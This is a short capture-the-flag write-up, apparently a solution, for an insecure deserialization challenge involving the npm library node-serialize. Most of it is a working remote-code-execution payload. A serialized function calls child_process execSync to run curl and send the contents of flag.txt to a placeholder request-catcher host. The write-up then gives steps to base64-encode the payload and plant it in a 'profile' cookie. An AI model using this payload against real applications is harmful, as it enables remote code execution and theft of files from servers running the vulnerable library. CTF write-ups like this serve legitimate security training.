# Super Cereal
Exploit: Insecure Deserialization

The npm library `node-serialize` is insecure against deserialization attacks. With a deserialization bug, you can achieve RCE.

Encode this into B64:

```
{"cereal":"_$$ND_FUNC$$_function(){ process.mainModule.require('child_process').execSync('curl REQUESTCATCHERHERE --data \\\"$(cat flag.txt)\\\"'); }()"}
```

Then put the B64-ed value into your "profile" cookie on the cereal site. 